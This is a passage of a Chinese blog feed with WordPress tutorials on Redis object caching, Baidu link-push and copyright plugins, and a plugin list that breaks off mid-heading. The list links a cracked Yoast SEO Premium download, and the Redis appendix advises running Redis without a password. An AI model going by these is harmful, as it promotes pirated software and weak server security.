        <content type="html"><![CDATA[<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h2><p>通过<strong>缓存加速 WordPress 站点访问</strong>的方法有很多，从软件层面来说，<strong>主要有两种方式</strong>：</p><ul><li><strong>生成静态页面缓存</strong>（如通过 WP Super Cache 插件实现）</li><li><strong>动态对象缓存</strong>（如通过 Redis Object Cache 插件实现，<strong>详见本文</strong>）</li></ul><p>对于一般的站点来说（例如WordPress博客，但需保证其大部分页面都没有随机化查询），如果不是刚需，使用WP Super Cache插件进行静态页面缓存加速是够用的，方便且暴力。</p><p>当然也可使用Redis Object Cache（基于Redis的动态对象缓存），但这更适用于那些经常需要动用数据库查询的站点（例如WordPress论坛）。</p><p>那么究竟<strong>什么时候用静态缓存，什么时候用动态缓存</strong>？可以参考下面两个例子：</p><p>① 假设一个日IP大于2万的WordPress站点，虽然这个站的流量很高，但是站点本身不需要开放用户注册的功能，那么站长最好的加速方案就是用各种类似WP Super Cache的插件生成静态页面。因为这类站点本身就不大需要动用数据库查询，所以自然也就不太需要Redis做对象缓存。</p><p>② 假设还是一个日IP大于2万的WordPress站点，但是这个站点必须要开放用户注册，并且用户注册的数量也相当之多，每天登录的用户也相当之多，那么这个时候一个生成静态页面的缓存插件可能就达不到理想的效果了。因为用户登录的这种行为，插件是无法静态化的，那么这种本身就需要经常动用数据库查询的操作，该如何提高效率呢？这个时候就需要用到Redis的对象缓存了。从本质上看，对象缓存就是缓存那些经常需要在数据库中查询的数据，当这种数据再次需要查询的时候，就可以通过Redis直接从内存中读取，而不需要再到MySQL中反复查询。这样就达到了一个加速、优化的效果。</p><p>下面则<font color="red"><strong>针对 WordPress + Redis 的部署方式进行详细说明</strong></font>。</p><h2 id="2-Redis-部署环境声明"><a href="#2-Redis-部署环境声明" class="headerlink" title="2. Redis 部署环境声明"></a>2. Redis 部署环境声明</h2><p>本文是基于Centos7系统中LAMP环境下的WordPress站点（详见<a href="../wordpress-bu-shu-bi-ji/">《LAMP环境 + WordPress 部署笔记》</a>），进行Redis缓存加速服务的部署。</p><h2 id="3-Redis-数据库服务端安装"><a href="#3-Redis-数据库服务端安装" class="headerlink" title="3. Redis 数据库服务端安装"></a>3. Redis 数据库服务端安装</h2><p>到官网下载最新版，本文下载的版本是 <font color="red">redis-4.0.10.tar.gz</font>：</p><ul><li>中文官网：<a href="http://www.redis.cn/">http://www.redis.cn/</a></li><li>英文官网（需翻墙）：<a href="https://redis.io/">https://redis.io/</a></li></ul><p>上传到WordPress所在的服务器，本文上传位置为（<strong>注意这个位置就是最终的安装目录</strong>）：</p><blockquote><p><font color="red">/usr/local/</font>redis-4.0.10.tar.gz</p></blockquote><p>解压安装包：</p><blockquote><p>tar -zxvf redis-4.0.10.tar.gz</p></blockquote><p>由于Redis需要编译安装，先安装gcc编译环境：</p><blockquote><p>yum install gcc</p></blockquote><p>进入Redis<strong>安装目录</strong>：</p><blockquote><p>cd <font color="red">/usr/local/redis-4.0.10/</font></p></blockquote><p>编译：</p><blockquote><p>make MALLOC=libc</p></blockquote><p>编译完成后，进入src目录：</p><blockquote><p>cd /usr/local/redis-4.0.10/src/</p></blockquote><p>把 src 目录下的文件安装到 /usr/local/bin ：</p><blockquote><p>make install</p></blockquote><p>至此<font color="red"><strong>Redis数据库服务端安装完成</strong></font>。</p><h2 id="4-Redis配置"><a href="#4-Redis配置" class="headerlink" title="4. Redis配置"></a>4. Redis配置</h2><p>默认情况下，Redis是通过这种方式启动的，非但无法在后台运行，而且也不符合使用习惯：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /usr/local/redis-4.0.10/src/   <span class="token comment" spellcheck="true"># 切换到启动脚本目录</span>./redis-server <span class="token punctuation">..</span>/redis.conf      <span class="token comment" spellcheck="true"># 启动Redis</span>Ctrl + C                          <span class="token comment" spellcheck="true"># 停止Redis</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>另外Redis也不直接支持开机自启，为此<strong>要对其进行改造</strong>。</p><h3 id="4-1-设置Redis为后台进程启动模式"><a href="#4-1-设置Redis为后台进程启动模式" class="headerlink" title="4.1. 设置Redis为后台进程启动模式"></a>4.1. 设置Redis为后台进程启动模式</h3><p>通过vi修改redis.conf文件：</p><blockquote><p>vi /usr/local/redis-4.0.10/redis.conf</p></blockquote><p>修改为支持后台启动，找到<strong>关键字 daemonize no</strong>，修改为：</p><blockquote><p>daemonize <font color="red">yes</font></p></blockquote><p>这里 <em>顺便修改</em> 最大内存为512M（根据实际情况配置，<font color="blue">建议为当前空闲内存的50%左右</font>），找到<strong>关键字maxmemory</strong>，修改为（注意<strong>单位是byte</strong>）：</p><blockquote><p>maxmemory 536870912</p></blockquote><h3 id="4-2-设置Redis开机自启动"><a href="#4-2-设置Redis开机自启动" class="headerlink" title="4.2. 设置Redis开机自启动"></a>4.2. 设置Redis开机自启动</h3><p>在/etc目录下新建redis目录：</p><blockquote><p>mkdir /etc/redis</p></blockquote><p>拷贝redis.conf配置文件到/etc/redis目录下，并<font color="red">重命名为6379.conf</font>（取的是Redis默认端口名称，Redis启动脚本里的变量会读取这个名称，因此<strong>若redis的端口号改了，这个文件名也要修改</strong>）：</p><blockquote><p>cp /usr/local/redis-4.0.10/redis.conf /etc/redis/6379.conf</p></blockquote><p>拷贝Redis的启动脚本到/etc/init.d目录下，并<font color="red">重命名为redisd</font>：</p><blockquote><p>cp /usr/local/redis-4.0.10/utils/redis_init_script /etc/init.d/redisd</p></blockquote><p>通过vi修改redisd文件：</p><blockquote><p>vi /etc/init.d/redisd</p></blockquote><p>在<strong>首行 #!/bin/sh 下面添加两行</strong>（其含义是Redis服务必须在运行级2，3，4，5下被启动或关闭，启动的优先级是90，关闭的优先级是10）：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span><span class="token comment" spellcheck="true"># chkconfig:   2345 90 10</span><span class="token comment" spellcheck="true"># description:  Redis is a persistent key-value database</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>切换到/etc/init.d目录：</p><blockquote><p>cd /etc/init.d</p></blockquote><p>设置为开机自启：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">chkconfig</span> redisd on<span class="token comment" spellcheck="true"># 关闭开机自启</span><span class="token comment" spellcheck="true"># chkconfig redisd off</span><span class="token comment" spellcheck="true"># 显示所有运行级系统服务的运行状态信息</span><span class="token comment" spellcheck="true"># chkconfig --list</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>现在可以<font color="red">直接以服务的形式启动和停止Redis了</font>：</p><ul><li>启动：service redisd start</li><li>停止：service redisd stop</li></ul><h2 id="5-Redis-Object-Cache-插件安装"><a href="#5-Redis-Object-Cache-插件安装" class="headerlink" title="5. Redis Object Cache 插件安装"></a>5. Redis Object Cache 插件安装</h2><p>直接在WordPress插件中心搜索安装即可，<strong>不需要也无法改动Redis配置</strong>。只要Redis服务没有修改过端口和密码，就可以使用默认值。</p><p>理论上通过修改WordPress的设置文件wp-config.php，可以添加并修改Redis Object Cache的配置，但实测无效（即使重启过服务器也不生效）：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">'WP_REDIS_CLIENT'</span><span class="token punctuation">,</span> <span class="token string">'pecl'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// 指定用于与Redis通信的客户端, pecl 即 The PHP Extension Community Library</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">'WP_REDIS_SCHEME'</span><span class="token punctuation">,</span> <span class="token string">'tcp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">// 指定用于与Redis实例进行通信的协议</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">'WP_REDIS_HOST'</span><span class="token punctuation">,</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// Redis服务器的IP或主机名</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">'WP_REDIS_PORT'</span><span class="token punctuation">,</span> <span class="token string">'6379'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Redis端口</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">'WP_REDIS_DATABASE'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">// 接受用于使用该SELECT命令自动选择逻辑数据库的数值</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">'P_REDIS_PASSWORD'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">// Redis密码</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">'WP_CACHE_KEY_SALT'</span><span class="token punctuation">,</span> <span class="token string">'wp_'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 设置所有缓存键的前缀（Wordpress多站点模式下使用）</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">'WP_REDIS_MAXTTL'</span><span class="token punctuation">,</span> <span class="token string">'86400'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./01.png"></p><h2 id="6-站点使用Redis后的变化"><a href="#6-站点使用Redis后的变化" class="headerlink" title="6. 站点使用Redis后的变化"></a>6. 站点使用Redis后的变化</h2><ul><li>页面访问几乎秒开（部署Redis前后加速非常明显）</li><li>后台编辑文章时保存变慢（可能需要做缓存同步）</li></ul><h2 id="附：Redis的密码问题"><a href="#附：Redis的密码问题" class="headerlink" title="附：Redis的密码问题"></a>附：Redis的密码问题</h2><p>默认情况下，Redis是不需要密码登陆的，而且若是用于WordPress的Redis Object Cache插件加速，也不建议配置Redis密码，因为不知道是不是当前Redis Object Cache插件版本的BUG，无法为其配置Redis密码，只能使用Redis的默认配置（无密码）进行数据库连接。</p><p>若非要设置Redis密码，可修改redis.conf文件，找到关键字requirepass，修改为：</p><blockquote><p>requirepass <font color="red">密码</font></p></blockquote><h2 id="资源下载"><a href="#资源下载" class="headerlink" title="资源下载"></a>资源下载</h2><blockquote><p><a href="http://download.csdn.net/download/lyy289065406/10516613">本文全文下载</a></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网站建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WordPress </tag>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WP 插件：Baidu Links Submit – 实时推送站点链接到百度</title>
      <link href="/articles/website/wp-cha-jian-baidulinkssubmit/"/>
      <url>/articles/website/wp-cha-jian-baidulinkssubmit/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>想要站点文章被百度收录，最快的方法就是主动推送文章链接到 <a href="https://ziyuan.baidu.com/badlink/index?site=">百度站长平台</a> 。</p><p>目前 <a href="https://ziyuan.baidu.com/badlink/index?site=">百度站长平台</a> 提供了5种提交链接的方式：</p><p>○ <strong>自动提交</strong></p><ul><li>□ 主动推送（API实时推送）</li><li>□ 自动推送（嵌入JS脚本实时推送）</li><li>□ sitemap（被动抓取）</li></ul><p>○ <strong>手动提交</strong></p><ul><li>□ 普通提交</li><li>□ 新站提交（限首次备案不超过3个月的站点）</li></ul><p>其中，<strong>sitemap</strong>只要配置好站点地图就不用管了，百度会定时抓取。</p><p>而<strong>手动提交</strong>一般没人去做，因为每篇文章都手动就太麻烦了（但是若是新站，则建议手动去提交下，会优先被录取）</p><p>至于 <strong>主动推送</strong> 和 <strong>自动推送</strong> 的功能是一样的，但因为有些站长因为不具备开发能力，操作起来还是相对麻烦的。</p><p>而本文要介绍的 <font color="red">Baidu Links Submit 插件就是封装了 <strong>主动推送</strong> 的能力</font>。</p><h2 id="下载并安装插件"><a href="#下载并安装插件" class="headerlink" title="下载并安装插件"></a>下载并安装插件</h2><p>Baidu Links Submit 插件最初来源于 <a href="http://bbs.zhanzhang.baidu.com/thread-28753-1-1.html">百度站长论坛</a>，但是因为原版主在2015年已停更，后来百度站长平台又升级了、加之插件本身也有几个BUG，最后导致无法使用了。</p><p>鉴于我比较喜欢这个插件的风格，因此我把2015版本的BUG修正后，重新发布了这个2018修正版：</p><blockquote><p><a href="http://download.csdn.net/download/lyy289065406/10519791">Baidu Links Submit  v2.0（20180704）下载</a></p></blockquote><p>把插件内的 <strong>baidu-links-submit文件夹</strong> 解压到 <strong>/wp-content/plugins/ 目录</strong> 即可完成安装。（由于此插件需要打印日志到文件，因此<font color="red">Linux系统注意不要使用root用户解压</font>，否则WordPress可能没有写日志文件的权限）</p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>如前文所述，该插件的功能就是向百度实时 <strong>主动推送</strong> 网站的新链接，因此需要注册 <a href="https://ziyuan.baidu.com/badlink/index?site=">百度站长平台</a> 配合使用。</p><h3 id="①-注册百度站长平台"><a href="#①-注册百度站长平台" class="headerlink" title="① 注册百度站长平台"></a>① 注册百度站长平台</h3><p>在 <a href="https://ziyuan.baidu.com/badlink/index?site="><strong>百度站长平台</strong></a> 注册一个账号，然后在“用户中心-&gt;站点管理”添加你的网站域名。</p><p>这里需要注意，如果网站是一级域名，例如本站是 exp-blog.com ，虽然在访问的时候是等价于 <a href="http://www.exp-blog.com/">www.exp-blog.com</a> 的， 但是<font color="red">在WordPress中设置的站点是 exp-blog.com，那么在百度站长平台添加的站点也必须是 exp-blog.com</font> （百度会建议你加上www，除非你的站点也有www，否则无视掉这个建议）。</p><p>换而言之，<font color="red">WordPress的站点必须与百度站长平台设置的站点完全一致，否则之后无法推送链接</font>。</p><h3 id="②-获取主动推送的-site-和-token"><a href="#②-获取主动推送的-site-和-token" class="headerlink" title="② 获取主动推送的 site 和 token"></a>② 获取主动推送的 site 和 token</h3><p>注册后，在“站点管理-&gt;链接提交-&gt;自动提交-&gt;主动推送（实时）”可以得到一串类似这样的推送地址：</p><blockquote><p><a href="http://data.zz.baidu.com/urls">http://data.zz.baidu.com/urls</a>?<font color="red"><strong>site</strong></font>=exp-blog.com&amp;<font color="red"><strong>token</strong></font>=xxxxxxxxxxxx</p></blockquote><p>把其中的site和token记录下来（注意这里的site其实就是第①步设置的站点地址）。</p><h3 id="③-设置-site-和-token-到插件"><a href="#③-设置-site-和-token-到插件" class="headerlink" title="③ 设置 site 和 token 到插件"></a>③ 设置 site 和 token 到插件</h3><p>在WordPress插件管理页面启动此插件，进入设置，填写第②步得到的 site 和token（同时建议打开Log日志开关），保存即可，以后新建文章或页面时就会自动推送到百度了。</p><p><img src="./01.png"></p><h2 id="关于推送结果"><a href="#关于推送结果" class="headerlink" title="关于推送结果"></a>关于推送结果</h2><p>发布文章后，可以通过插件的设置页，查看“<strong>当日限额&amp;提交量</strong>”是否发生变化，以确认是否推送成功（<strong>百度站长平台是隔天统计的，不能马上查看到推送情况</strong>）。</p><p>若提交量无变化，则可登陆系统后台查看日志确认原因：</p><blockquote><p>/wp-content/plugins/baidu-links-submit/log/submits.log</p></blockquote><p>若<strong>推送成功</strong>返回的报文日志是这样的（其中remain表示当天的剩余配额，success表示已成功推送的数量）：</p><pre class="line-numbers language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"remain"</span><span class="token operator">:</span> <span class="token number">4999999</span><span class="token punctuation">,</span>  <span class="token property">"success"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>若推送返回的报文日志是这样的（<strong>not_same_site非空</strong>），则是提交失败：</p><pre class="line-numbers language-json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"remain"</span><span class="token operator">:</span> <span class="token number">5000000</span><span class="token punctuation">,</span>  <span class="token property">"success"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>  <span class="token property">"not_same_site"</span><span class="token operator">:</span> <span class="token punctuation">[</span>    <span class="token string">"http://www.exp-blog.com/website/wp-cha-jian-baidulinkssubmit/"</span>  <span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发生这种情况是因为百度认为<strong>当前站点推送了不属于该站点的链接</strong>，这是不允许的。而原因很可能就是 WordPress设置的站点名称 与 百度站长平台设置的站点名称 不一致引起的，<strong>处理方法</strong>见前文 <a href="#%E2%91%A0-%E6%B3%A8%E5%86%8C%E7%99%BE%E5%BA%A6%E7%AB%99%E9%95%BF%E5%B9%B3%E5%8F%B0">① 注册百度站长平台</a>。</p><h2 id="关于重复推送"><a href="#关于重复推送" class="headerlink" title="关于重复推送"></a>关于重复推送</h2><p>每篇文章在推送到百度后，文章的<font color="red"><strong>自定义栏目会多出一个值Baidusubmit</strong></font>， true表示推送成功，false表示推送失败。</p><p>推送成功的文章不会再次推送链接（即使更新过内容），而推送失败的文章，在下次更新时会尝试重新推送。</p><p>若需要重新推送某篇已推送成功的文章，可以把Baidusubmit的值改成false（或直接删除之），但<strong>一般不建议这样做</strong>，因为<strong>二次提交容易导致百度翻脸，从而下调推送配额</strong>。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网站建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 插件 </tag>
            
            <tag> WordPress </tag>
            
            <tag> Baidu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WP 插件：Auto Add Copyright – 被复制时自动追加版权链接</title>
      <link href="/articles/website/wp-cha-jian-autoaddcopyright/"/>
      <url>/articles/website/wp-cha-jian-autoaddcopyright/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这是本站出品的第一个WP插件，纪念一下。</p><p>当你在网站辛苦发布的文章，被别人不露声色随便拷贝走了，是不是很心痛呢？</p><p><strong>本插件可以在别人拷贝你站点内容的时候，自动在内容末尾追加你的站点版权信息</strong>。</p><p>顺带一提，虽然已经有插件（如 <a href="../wordpress-cha-jian-tui-jian/#toc-heading-24">WP Content Copy Protection &amp; No Right Click</a>）可以<strong>完全禁止读者复制你站点的内容</strong>以保护你的资源，但是这对读者<strong>是很不友好的</strong>。尤其当你的站点提供了一些教程类的文章、且文章中存在命令断句时，读者如果不能复制这些命令是很痛苦的事情。</p><h2 id="优势比对"><a href="#优势比对" class="headerlink" title="优势比对"></a>优势比对</h2><p>网上已经有很多同类的JS脚本， 但是<strong>大部分都因为过时而存在不少问题</strong>，这里简单做个比较：</p><table><thead><tr><th align="center">方法</th><th align="center">类型</th><th align="center">优点</th><th align="center">缺点</th></tr></thead><tbody><tr><td align="center">window.clipboard</td><td align="center">JS脚本</td><td align="center">直接操作剪贴板，简单易用</td><td align="center">仅适用于IE浏览器</td></tr><tr><td align="center">ZeroClipboard</td><td align="center">JS脚本</td><td align="center">解决了window.clipboard的适用范围问题</td><td align="center">需要Flash支持，但在HTML5技术<br>流行的当下，Flash已淘汰</td></tr><tr><td align="center">window.getSelection</td><td align="center">JS脚本</td><td align="center">无需操作剪贴板，兼容大部分浏览器</td><td align="center">所复制的内容会丢失换行等格式，<br>且内容中若有代码也会丢失<br>（尤其是html）</td></tr><tr><td align="center"><font color="red">Auto Add Copyright</font></td><td align="center">WP插件</td><td align="center">解决了前面所有缺点</td><td align="center">暂时没想到</td></tr></tbody></table><blockquote><p><strong><em>注：</em></strong><br> <em>且凡是需要通过JS脚本实现的，一般都要修改主题的 function.php、head.php 或 footer.php 文件。</em><br> <em>先不论站长是否具备编程能力，至少切换主题后都需要再次修改代码。</em><br> <em>而本插件则完全没有这个问题。</em></p></blockquote><h2 id="插件特色"><a href="#插件特色" class="headerlink" title="插件特色"></a>插件特色</h2><ul><li>当读者试图复制站点内容时，会自动在复制内容末尾追加站点版权信息</li><li>可设置允许读者复制的内容长度，小于这个长度不会触发追加机制</li><li>可设置本插件的生效范围：全站、或仅文章页面</li><li>支持大部分主流浏览器</li><li>复制内容支持纯文本、代码等，不会造成复制内容格式变形</li></ul><p><img src="./01.png"></p><h2 id="插件下载"><a href="#插件下载" class="headerlink" title="插件下载"></a>插件下载</h2><blockquote><p><a href="http://download.csdn.net/download/lyy289065406/10527059">Auto Add Copyright   v1.0（20180707）下载</a></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网站建设 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 插件 </tag>
            
            <tag> WordPress </tag>
            
            <tag> Copyright </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WordPress 插件推荐</title>
      <link href="/articles/website/wordpress-cha-jian-tui-jian/"/>
      <url>/articles/website/wordpress-cha-jian-tui-jian/</url>
      
        <content type="html"><![CDATA[<h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>本文所介绍的插件，都是本站用过、在用、或者改善过的，并非简单搬运。</p><p>因为好用，所以推荐给大家，请放心食用。</p><h2 id="Jetpack-（WP怪兽级插件）"><a href="#Jetpack-（WP怪兽级插件）" class="headerlink" title="Jetpack （WP怪兽级插件）"></a><font color="red"><del>Jetpack （WP怪兽级插件）</del></font></h2><p><strong>国外最推荐</strong>的插件没有之一，<strong>国内最不推荐</strong>的插件没有之一。</p><p>JetPack插件是WordPress社区官方出品的怪兽级插件，这个插件里面集成了30个左右的网站常用的辅助功能，比如网站统计，社交分享，安全管理，邮件发送，自定义评论，拼写检查，CDN加速，移动版主题支持等等。</p><p>可以理解为：JetPack插件等于30个左右独立的插件，这30个左右的功能，都有独立的开关控制。不过，<strong>如果WordPress站点服务器在国内，别用JetPack插件，想都不要想</strong>。</p><p>这是因为JetPack插件的许多功能，都需要链接wordpress.com这个网站的服务器，而<strong>wordpress.com在墙外已经很多年了</strong>。</p><p>JetPack插件可以说是云插件，许多功能要链接到云端服务器才能完成。站点服务器在国外的话，连接wordpress.com就应该没有问题的，这时可以使用JetPack插件。但是如果站点服务器是面向国内的，JetPack插件就无法使用了，而且可能会因为访问wordpress.com超时而拖垮整个站点的访问效率。</p><h2 id="Yoast-Complete-SEO-（搜索引擎优化工具）"><a href="#Yoast-Complete-SEO-（搜索引擎优化工具）" class="headerlink" title="Yoast-Complete-SEO （搜索引擎优化工具）"></a><font color="red"><del>Yoast-Complete-SEO （搜索引擎优化工具）</del></font></h2><p>很强悍的SEO优化插件，在国外非常流行，据说超过25%的站点都在使用它提高搜索排名。但是<strong>在国内</strong>还是要<strong>慎用</strong>，此插件有部分功能可能要访问国外IP，<strong>启用后明显感觉到网站打开速度变慢</strong>。</p><blockquote><p><a href="http://download.csdn.net/download/lyy289065406/10508921">Yoast-Complete-SEO-Premium-Pack-7.4.2 英文破解版下载</a></p></blockquote><p>此插件包解压即用，所有功能都被破解，但不能登录不能升级，不然就无法再用了。其内<strong>集合了5个插件，一般网站主要安装前2个</strong>即可：</p><ul><li>① wpseo-local：基础包</li><li>② wordpress-seo-premium：专业包</li><li>③ wpseo-news：非新闻站点可不安装</li><li>④ wpseo-video：非视频站点可不安装</li><li>⑤ wpseo-woocommerce：非社交站点可不安装</li></ul><p><strong>优化项目包括但不限于</strong>：</p><ul><li>① 标题&amp;元标记： 可以进行首页、分类、文章、页面的标题、描述、关键字的设置</li><li>② 社会化： 只有Facebook，所以国人可以忽视这个</li><li>③ XML站点地图： 开启XML站点地图功能，可以不用 Google XML Sitemaps 插件了</li><li>④ 固定链接： 去除分类目录URL中的默认结构（通常是/category/），可以删除 WP No Category Base 插件了；重定向附件URL到其附加的文章页面</li><li>⑤ 内部链接： 就是面包屑导航</li><li>⑥ RSS： 可自动在你的RSS中添加内容。更确切地说，这意味着可以给你的网站和文章添加反向链接。当采集器也这么做，就帮助搜索引擎识别你是原创作者。</li><li>⑦ WordPress SEO by Yoast 一个比较值得称赞的是<strong>文章发布时，有一个SEO检测功能</strong>，能够对当前文章进行检测并给出改善的建议</li></ul><p><img src="./01.png"></p><h2 id="WP-Editor-md-（WP专用的Markdown）"><a href="#WP-Editor-md-（WP专用的Markdown）" class="headerlink" title="WP Editor.md （WP专用的Markdown）"></a><font color="red">WP Editor.md （WP专用的Markdown）</font></h2><p>写博客必备，在WordPress平台中最好的Markdown插件，没有之一。</p><p><strong>特色</strong>：</p><ul><li>① 支持基本的Markdown语法</li><li>② 支持KaTex/Latex数学公式语法（<a href="https://download.csdn.net/download/lyy289065406/10485168">Latex语法文档下载</a>）</li><li>③ 支持即时截图并黏贴插入</li><li>④ 支持生成toc目录 （需安装<strong>配套插件 Table of Contents Plus</strong>）</li><li>⑤ 支持在评论使用Markdown（需安装<strong>配套插件 WP Product Review Lite</strong>）</li><li>⑥ 支持实时预览</li><li>⑦ 支持文章分页</li><li>⑧ 支持代码语法高亮（这个功能不好看，下面用CSH插件补足）</li></ul><p><img src="./02.png"></p><p><img src="./03.png"></p><p><strong>注意</strong>：</p><p>WP Editor.md 的 KaTex/Latex 功能需要使用CDN加速，不同地域需要设置不同的CDN服务器。</p><p>当发现 KaTex/Latex 公式无法显示时，打开F12控制台日志看见如下图的404异常，则说明是CDN服务器异常。</p><p><img src="./04.png"></p><p>此时通过 <strong>WP Editor.md -&gt; 常规设置</strong> 修改CDN路线，直到 KaTex/Latex 公式可以生效即可。</p><p><img src="./05.png"></p><h2 id="Crayon-Syntax-Highlighter-（Crayon语法显示）"><a href="#Crayon-Syntax-Highlighter-（Crayon语法显示）" class="headerlink" title="Crayon Syntax Highlighter （Crayon语法显示）"></a><font color="red">Crayon Syntax Highlighter （Crayon语法显示）</font></h2><p>程序员必备，在WordPress平台中最好的语法高亮插件，没有之一。</p><p><strong>特色</strong>：</p><ul><li>① 内置多种代码的语法高亮风格</li><li>② 支持行号显示</li><li>③ 支持源码查看</li><li>④ 支持双击复制</li></ul><p><img src="./06.png"></p><p><strong>注意</strong>：这个插件的默认配置与 WP Editor.md 有冲突，在显示代码时会把代码中的html变成转义字符。</p><p>造成此问题的<strong>原因</strong>是：在后台编辑框中提交的文本被保存到数据库中，在前台展示时才会经过Markdown转码。但是做的是先由Markdown根据语法转码后交由Crayon Syntax Highlighter进行代码高亮的渲染。而Markdown会将代码中的特殊符号经由HTML进行转义，而Crayon Syntax Highlighter会原封不动地显示&lt;pre&gt;标签中的代码，于是转义过后的代码就被原封不动地展示出来了。</p><p>为了<strong>解决此问题</strong>，Crayon Syntax Highlighter必须在渲染时将转义过后的代码再转义回来，设置选项如下（<strong>修改配置后，受影响的文章可能需要重新提交才能生效</strong>）：</p><p>如下图<strong>勾选</strong>这两个选项：<br><img src="./07.png"></p><p>如下图<strong>取消</strong>这两个选项：<br><img src="./08.png"></p><h2 id="WP-Statistics-（WP统计器）"><a href="#WP-Statistics-（WP统计器）" class="headerlink" title="WP Statistics （WP统计器）"></a><font color="red">WP Statistics （WP统计器）</font></h2><p>在WordPress平台中最强大的统计插件，没有之一。</p><p><strong>支持统计内容</strong>：</p><ul><li>◇  在线用户</li><li>◇  今天的访问</li><li>◇  今天的访问</li><li>◇  昨日访问</li><li>◇  昨日访客</li><li>◇  过去一周的访问量</li><li>◇  过去一个月的访问量</li><li>◇  过去一年的访问量</li><li>◇  累计访问</li><li>◇  累计访客</li><li>◇  页面访问总数</li><li>◇  搜索引擎引用次数</li><li>◇  总计文章</li><li>◇  总计页面</li><li>◇  总计回响</li><li>◇  总计垃圾</li><li>◇  总计用户</li><li>◇  平均文章</li><li>◇  平均评论</li><li>◇  平均用户</li><li>◇  最后发表日期</li></ul><p><img src="./09.png"></p><h2 id="WP-PostViews-（文章阅读次数统计器）"><a href="#WP-PostViews-（文章阅读次数统计器）" class="headerlink" title="WP-PostViews （文章阅读次数统计器）"></a><font color="red">WP-PostViews （文章阅读次数统计器）</font></h2><p>当你所使用的站点主题不能<strong>对每篇文章的阅读数进行单独统计</strong>时，此插件可以补全此功能。</p><p>此插件<strong>要求站长具备一定的编程能力</strong>，因为它不能仅仅单纯在前端配置就生效，而是需要同时修改主题的php文件代码，在希望它出现的地方嵌入代码。</p><p><img src="./10.png"></p><h2 id="WP-PostRatings-（文章评分器）"><a href="#WP-PostRatings-（文章评分器）" class="headerlink" title="WP-PostRatings （文章评分器）"></a><font color="red">WP-PostRatings 